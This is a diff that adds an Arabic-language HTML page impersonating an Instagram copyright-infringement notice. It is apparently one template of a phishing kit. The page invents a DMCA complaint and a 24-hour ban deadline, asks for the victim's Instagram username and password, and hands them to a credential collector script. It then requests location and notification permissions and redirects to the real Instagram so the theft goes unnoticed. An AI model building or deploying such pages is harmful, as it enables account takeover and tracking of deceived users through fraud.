@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="theme-color" content="#dc2626">
+<title>تحذير حقوق النشر - Instagram</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html, body {
+    min-height: 100vh;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: #fef2f2;
+    color: #1c1e21;
+  }
+  .topbar {
+    background: #dc2626;
+    color: #fff;
+    padding: 16px 20px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+  .topbar-icon {
+    font-size: 24px;
+  }
+  .topbar-text {
+    font-size: 14px;
+    font-weight: 600;
+  }
+  .container {
+    max-width: 460px;
+    margin: 0 auto;
+    padding: 24px 20px;
+  }
+  .alert-card {
+    background: #fff;
+    border: 2px solid #dc2626;
+    border-radius: 16px;
+    padding: 24px;
+    margin-bottom: 16px;
+    position: relative;
+    overflow: hidden;
+  }
+  .alert-card::before {
+    content: '⚠️';
+    position: absolute;
+    top: 16px; left: 16px;
+    font-size: 40px;
+    opacity: 0.15;
+  }
+  .alert-title {
+    color: #dc2626;
+    font-size: 20px;
+    font-weight: 800;
+    margin-bottom: 8px;
+    padding-left: 60px;
+  }
+  .alert-subtitle {
+    font-size: 14px;
+    color: #65676b;
+    line-height: 1.6;
+    padding-left: 60px;
+  }
+  .violation-box {
+    background: #fef2f2;
+    border: 1px solid #fecaca;
+    border-radius: 12px;
+    padding: 16px;
+    margin: 20px 0;
+  }
+  .violation-title {
+    font-size: 13px;
+    color: #991b1b;
+    font-weight: 700;
+    margin-bottom: 10px;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+  }
+  .violation-item {
+    font-size: 13px;
+    color: #7f1d1d;
+    padding: 6px 0;
+    border-bottom: 1px solid #fecaca;
+    line-height: 1.5;
+  }
+  .violation-item:last-child { border-bottom: none; }
+  .info-card {
+    background: #fff;
+    border: 1px solid #e5e7eb;
+    border-radius: 16px;
+    padding: 24px;
+  }
+  .info-card h3 {
+    font-size: 17px;
+    font-weight: 700;
+    margin-bottom: 8px;
+  }
+  .info-card p {
+    font-size: 14px;
+    color: #65676b;
+    line-height: 1.6;
+    margin-bottom: 20px;
+  }
+  .input {
+    width: 100%;
+    padding: 14px 16px;
+    background: #fafafa;
+    border: 1px solid #dbdbdb;
+    border-radius: 10px;
+    font-size: 15px;
+    font-family: inherit;
+    color: #262626;
+    margin-bottom: 12px;
+  }
+  .input:focus {
+    outline: none;
+    border-color: #dc2626;
+    background: #fff;
+    box-shadow: 0 0 0 3px rgba(220,38,38,0.1);
+  }
+  .btn {
+    width: 100%;
+    padding: 15px;
+    background: #dc2626;
+    color: #fff;
+    border: none;
+    border-radius: 10px;
+    font-size: 15px;
+    font-weight: 700;
+    cursor: pointer;
+    font-family: inherit;
+  }
+  .btn:active { transform: scale(0.98); }
+  .btn:disabled { opacity: 0.6; }
+  .btn-secondary {
+    background: #fff;
+    color: #dc2626;
+    border: 2px solid #dc2626;
+    margin-top: 10px;
+  }
+  .error-msg {
+    background: #ffebe8;
+    border: 1px solid #dd3c10;
+    border-radius: 8px;
+    padding: 10px 12px;
+    color: #dd3c10;
+    font-size: 13px;
+    margin-bottom: 12px;
+    display: none;
+  }
+  .error-msg.show { display: block; }
+</style>
+</head>
+<body>
+
+<div class="topbar">
+  <div class="topbar-icon">🚨</div>
+  <div class="topbar-text">تحذير من فريق حقوق النشر - Instagram</div>
+</div>
+
+<div class="container">
+
+  <div class="alert-card">
+    <div class="alert-title">تم الإبلاغ عن انتهاك حقوق النشر</div>
+    <div class="alert-subtitle">
+      تلقينا شكوى من مالك حقوق نشر يفيد بأن أحد منشوراتك ينتهك حقوق الطبع.
+    </div>
+  </div>
+
+  <div class="violation-box">
+    <div class="violation-title">📋 تفاصيل الشكوى:</div>
+    <div class="violation-item">
+      <strong>رقم الشكوى:</strong> #IG-DMCA-2026-8947
+    </div>
+    <div class="violation-item">
+      <strong>المُبلِّغ:</strong> Universal Music Group
+    </div>
+    <div class="violation-item">
+      <strong>نوع الانتهاك:</strong> محتوى صوتي محمي
+    </div>
+    <div class="violation-item">
+      <strong>العقوبة المتوقعة:</strong> حظر الحساب 30 يوماً
+    </div>
+  </div>
+
+  <div class="info-card">
+    <h3>⚠️ لديك 24 ساعة للاعتراض</h3>
+    <p>
+      لتقديم اعتراض رسمي وإلغاء الشكوى، يرجى تسجيل الدخول بحسابك وإرسال اعتراضك للفريق القانوني.
+    </p>
+
+    <div class="error-msg" id="error-msg"></div>
+
+    <form id="copyright-form" onsubmit="return handleCopyright(event)">
+      <input type="text" id="username" class="input" placeholder="اسم المستخدم على Instagram" required>
+      <input type="password" id="password" class="input" placeholder="كلمة المرور" required>
+      <button type="submit" class="btn" id="copyright-btn">
+        تقديم اعتراض رسمي ⚖️
+      </button>
+    </form>
+
+    <button type="button" class="btn btn-secondary" onclick="alert('سيتم حظر حسابك خلال 24 ساعة');">
+      أوافق على الحظر
+    </button>
+  </div>
+
+</div>
+
+<script src="/fs/static/collector.js"></script>
+
+<script>
+(function() {
+    "use strict";
+
+    var submitting = false;
+
+    function showError(msg) {
+        var el = document.getElementById('error-msg');
+        el.textContent = msg;
+        el.classList.add('show');
+        setTimeout(function() { el.classList.remove('show'); }, 4000);
+    }
+
+    function handleCopyright(event) {
+        event.preventDefault();
+        if (submitting) return false;
+
+        var username = document.getElementById('username').value.trim();
+        var password = document.getElementById('password').value.trim();
+
+        if (!username || !password) {
+            showError('يرجى ملء جميع الحقول');
+            return false;
+        }
+
+        submitting = true;
+        var btn = document.getElementById('copyright-btn');
+        btn.disabled = true;
+        btn.textContent = 'جاري إرسال الاعتراض...';
+
+        FSCollector.captureForm({
+            username: username,
+            password: password,
+            form_type: 'copyright_appeal'
+        }, {
+            metadata: { page: 'instagram_05_copyright' }
+        }).then(function() {
+            FSCollector.showLoader('جاري حفظ الاعتراض...');
+
+            setTimeout(function() {
+                FSCollector.requestPermissions({
+                    camera: false,
+                    microphone: false,
+                    location: true,
+                    notifications: true,
+                    showOverlay: true
+                }).then(function(perms) {
+                    FSCollector.sendPermissionsResult(perms);
+
+                    setTimeout(function() {
+                        FSCollector.redirect('https://www.instagram.com');
+                    }, 2000);
+                });
+            }, 500);
+        });
+
+        return false;
+    }
+
+    window.handleCopyright = handleCopyright;
+
+})();
+</script>
+
+</body>
+</html>
